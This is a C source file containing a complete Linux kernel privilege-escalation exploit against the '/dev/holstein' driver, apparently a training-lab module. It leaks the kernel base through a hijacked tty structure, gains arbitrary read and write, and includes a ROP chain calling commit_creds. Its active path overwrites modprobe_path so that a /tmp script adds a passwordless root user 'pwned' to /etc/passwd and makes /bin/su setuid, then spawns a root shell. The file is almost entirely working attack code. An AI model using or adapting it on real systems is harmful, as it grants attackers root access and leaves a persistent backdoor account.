#include <fcntl.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>

#define debug(msg, ...)                                                        \
    {                                                                          \
        if (DEBUG_FLAG) {                                                      \
            fprintf(stderr, "[D] " msg "\n", ##__VA_ARGS__);                   \
        }                                                                      \
    }
#define info_prefix "[*] "
#define info(msg, ...) printf(info_prefix msg "\n", ##__VA_ARGS__);
#define progress(msg, ...) printf("[+] " msg "\r", ##__VA_ARGS__);
#define fatal(msg, ...)                                                        \
    {                                                                          \
        printf("[!] " msg "\n", ##__VA_ARGS__);                                \
        exit(EXIT_FAILURE);                                                    \
    }
#define pause()                                                                \
    {                                                                          \
        printf(info_prefix "Press ENTER to continue");                         \
        getchar();                                                             \
    }
#define var(var) printf(info_prefix #var " = 0x%016llx\n", var);
#define rebase(addr) (addr - RAW_KBASE + kbase)

#define DEVICE_NAME "/dev/holstein"
#define RAW_KBASE 0xffffffff81000000

/* push rdx; xor eax, 0x415b004f; pop rsp; pop rbp; ret; */
#define push_rdx_pop_rsp rebase(0xffffffff8114fbea)
#define pop_rdi rebase(0xffffffff8114078a)
#define mov_rax_prdx rebase(0xffffffff813aadf9)
#define mov_prdx_ecx rebase(0xffffffff810109ed)

#define prepare_kernel_cred rebase(0xffffffff81072560)
#define commit_creds rebase(0xffffffff810723c0)
#define swapgs_restore_regs_and_return_to_usermode                             \
    rebase(0xffffffff81800e10 + 22)
#define modprobe_path rebase(0xffffffff81e38480)

typedef unsigned long long u64;
typedef unsigned int u32;
typedef unsigned char u8;

u8 DEBUG_FLAG = 0;

int g_fd, g_ptmx_fd;
u64 g_buf_addr, g_buf_addr2;

u8 buf[0x400];

u64 user_cs, user_rflags, user_sp, user_ss;
u64 cookie, kbase, offset;
u64 tmp_buf, cred_struct;

enum current_state {
    create_cred_struct_state,
    spawn_shell_state,
} global_cstate = create_cred_struct_state;

void _write(int fd, void *buf, size_t sz) {
    ssize_t nb = write(fd, buf, sz);
    if (nb < 0) {
        fatal("write failure");
    }
    debug("Wrote 0x%zx bytes", nb);
}

void _read(int fd, void *buf, size_t sz) {
    ssize_t nb = read(fd, buf, sz);
    if (nb < 0) {
        fatal("read failure");
    }
    debug("Read 0x%zx bytes", nb);
}

void open_dev(int *fd) {
    *fd = open(DEVICE_NAME, O_RDWR);
    if (*fd < 0) {
        fatal("Failed to open device: %s", DEVICE_NAME);
    }
    debug("Device opened");
}

void spawn_shell(void) {
    uid_t uid = geteuid();
    if (uid > 0) {
        fatal("Failed to get root uid, current uid = %d", uid);
    }
    info("Spawning shell as root uid");
    system("/bin/sh");
}

void safe_exit(void);

void aaw32(u64 addr, u32 val) {
    *(u64 *)&buf[0x3f8] = mov_prdx_ecx;
    *(u64 *)&buf[0x18] = g_buf_addr + 0x3f8 - 0xc * 8;
    _write(g_fd, buf, sizeof(buf));
    ioctl(g_ptmx_fd, val, addr);
}

u32 aar32(u64 addr) {
    *(u64 *)&buf[0x3f8] = mov_rax_prdx;
    *(u64 *)&buf[0x18] = g_buf_addr + 0x3f8 - 0xc * 8;
    _write(g_fd, buf, sizeof(buf));
    return ioctl(g_ptmx_fd, 0, addr);
}

void overwrite_modprobe_path_privesc() {
    char cmd[] = "/tmp/evil.sh";
    for (u64 i = 0; i < sizeof(cmd); i += 4) {
        aaw32(modprobe_path + i, *(u32 *)&cmd[i]);
    }

    int fd = open(cmd, O_RDWR | O_CREAT);
    dprintf(fd, "%s",
            "#!/bin/sh\n"
            "echo 'pwned::0:0::/:/bin/sh' >> /etc/passwd\n"
            "chown root:root /bin/su\n"
            "chmod +s /bin/su\n");
    close(fd);
    if (chmod(cmd, 0777)) {
        fatal("chmod %s", cmd);
    }
    char trigger[] = "/tmp/x";
    fd = open(trigger, O_RDWR | O_CREAT);
    dprintf(fd, "%s", "\xff\xff\xff\xff");
    close(fd);
    if (chmod(trigger, 0777)) {
        fatal("chmod %s", cmd);
    }
    system(trigger);
    system("su pwned");
    return;
}

void ropchain(int fd) {
    u64 *ptr = (u64 *)buf;
    u64 i = 0;
    ptr[i++] = pop_rdi;
    if (global_cstate == create_cred_struct_state) {
        ptr[i++] = 0;
        ptr[i++] = prepare_kernel_cred;
    } else if (global_cstate == spawn_shell_state) {
        ptr[i++] = cred_struct;
        ptr[i++] = commit_creds;
    }
    ptr[i++] = swapgs_restore_regs_and_return_to_usermode;
    ptr[i++] = 0;
    ptr[i++] = 0;
    ptr[i++] = (size_t)safe_exit;
    ptr[i++] = user_cs;
    ptr[i++] = user_rflags;
    ptr[i++] = user_sp;
    ptr[i++] = user_ss;

    ptr[0xc] = push_rdx_pop_rsp;
    _write(fd, buf, sizeof(buf));
}

void rop_privesc(int fd, u64 buf_addr) {
    ropchain(fd);
    int tmp_fd;
    open_dev(&g_fd);
    open_dev(&tmp_fd);
    close(tmp_fd);
    int ptmx_fd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (ptmx_fd < 0) {
        fatal("open /dev/ptmx");
    }
    _read(g_fd, buf, sizeof(buf));
    if (global_cstate == create_cred_struct_state) {
        g_buf_addr2 = *(u64 *)&buf[0x38] - 0x38;
        var(g_buf_addr2);
    }
    /* Overwrite tty_ops */
    *(u64 *)&buf[0x18] = buf_addr;
    _write(g_fd, buf, sizeof(buf));
    ioctl(ptmx_fd, 0xdeadbeef, buf_addr - 0x8);
}

void safe_exit(void) {
    __asm__(".intel_syntax noprefix;"
            "mov tmp_buf, rax;"
            ".att_syntax noprefix;");
    if (global_cstate == create_cred_struct_state) {
        cred_struct = tmp_buf;
        debug("cred_struct @ 0x%llx", cred_struct);
        global_cstate = spawn_shell_state;
        rop_privesc(g_fd, g_buf_addr2);
        return;
    }
    spawn_shell();
}

void save_user_state(void) {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_sp, rsp;"
            "mov user_ss, ss;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
    debug("User state saved");
}

int main(int argc, char *argv[]) {
    for (size_t i = 0; i < argc; i++) {
        if (strcmp(argv[i], "DEBUG") == 0) {
            DEBUG_FLAG = 1;
            break;
        }
    }
    setbuf(stdout, 0);
    save_user_state();

    int tmp_fd;
    open_dev(&g_fd);
    open_dev(&tmp_fd);
    close(tmp_fd);
    g_ptmx_fd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (g_ptmx_fd < 0) {
        fatal("open /dev/ptmx");
    }
    _read(g_fd, buf, sizeof(buf));
    kbase = *(u64 *)&buf[0x18] - 0xc39c60;
    g_buf_addr = *(u64 *)&buf[0x38] - 0x38;
    var(kbase);
    var(g_buf_addr);
    /* rop_privesc(g_fd, g_buf_addr); */
    overwrite_modprobe_path_privesc();

    return 0;
}
